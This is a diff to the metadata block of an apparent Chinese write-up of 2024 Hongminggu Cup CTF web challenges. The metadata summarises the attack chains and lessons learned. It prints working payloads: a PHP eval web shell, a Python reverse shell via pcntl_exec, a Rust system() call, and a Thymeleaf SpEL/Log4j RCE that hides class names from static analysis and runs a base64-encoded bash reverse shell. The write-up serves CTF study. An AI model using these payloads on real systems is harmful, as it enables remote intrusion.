@@ -15,7 +15,9 @@ tags:
 - Log4j-LoaderUtil
 - SSRF/curl+跳板
 - Java外部类
-attack_chain: 'PHP-Filter链: synacktiv/php_filter_chains_oracle_exploit工具跑出flag.php|匿名类: ?ezphpPhp8=class@anonymous\0/var/www/html/flag.php:7$0 调getflag|disable_function: Basic Auth admin/2e525e29e465f45d8d7c56319fe73036+@eval($_GET[''cmd''])+pcntl_exec python反弹|Rust: 过滤std→include!("/flag")或extern "C" fn system+unsafe{Spring Boot curl+getsites: SSRF/curl下载vps+hostname SpelExpressionParser+Log4j LoaderUtil调Runtime.exec反弹'
+attack_chain:
+- 'PHP-Filter链: synacktiv/php_filter_chains_oracle_exploit工具跑出flag.php|匿名类: ?ezphpPhp8=class@anonymous\0/var/www/html/flag.php:7$0 调getflag|disable_function: Basic Auth admin/2e525e29e465f45d8d7c56319fe73036+@eval($_GET[''cmd''])+pcntl_exec python反弹|Rust: 过滤std'
+- 'include!("/flag")或extern "C" fn system+unsafe{Spring Boot curl+getsites: SSRF/curl下载vps+hostname SpelExpressionParser+Log4j LoaderUtil调Runtime.exec反弹'
 key_payload: '?ezphpPhp8=class@anonymous%00/var/www/html/flag.php:7$0|pcntl_exec("/usr/bin/python",array(''-c'',''import socket,subprocess,os;s=socket.socket(...);s.connect(...);os.dup2(s.fileno(),0,1,2);p=subprocess.call(["/bin/bash","-i"])''))|fn main() { include!("/flag"); }|extern "C" { fn system(cmd: *const u8) -> i32; } unsafe { system("cat /flag".as_ptr()); }|T(org.thymeleaf.util.ClassLoaderUtils).loadClass(''org.apa''+''che.logging.log4j.util.LoaderUtil'').newInstanceOf(''org.spr''+''ingframework.expression.spel.standard.SpelExpressionParser'').parseExpression(''T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8wLjAuMC4wLzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}")'').getValue()'
 one_liner: 第四届红明谷杯卫星应用WEB 4题:PHP-Filter链oracle读源(synacktiv工具)+匿名类anonymous\0/var/www/html/flag.php:7$0+pcntl_exec反弹shell+Rust-std过滤用include!("/flag")或extern C system+Spring Boot/curl SSRF跳板/Log4j LoaderUtil调SpelExpressionParser反弹
 lesson: 1) PHP-Filter链 oracle攻击:synacktiv工具可基于错误状态oracle盲读任意文件; 2) PHP匿名类引用:`class@anonymous\0/path/file.php:line$idx`; 3) disable_function绕:pcntl_exec调python反弹shell (subprocess+os.dup2); 4) Rust std过滤:include!("/flag") 或 FFI extern "C" unsafe { system(...) }; 5) Spring Boot Thymeleaf SpEL RCE:`[[${T(...).parseExpression('T(java.lang.Runtime).getRuntime().exec(...)').getValue()}]]`; 6) Java外部类字符串拼接:'org.apa'+'che.logging.log4j.util.LoaderUtil' 绕静态分析; 7) curl+SSRF跳板:public vps→/curl?url→hostname 跳本地127.0.0.1
@@ -65,6 +67,9 @@ prerequisites:
 - PHP 匿名类反射调用
 - disable_function 绕过（pcntl_exec/LD_PRELOAD）
 - Rust FFI/unsafe
+contest_normalized: "红明谷杯"
+contest_year: 2024
+subcategory_guess: "ssrf"
 ---
 # 第四届红明谷杯卫星应用数据安全大赛 WEB writeup
 
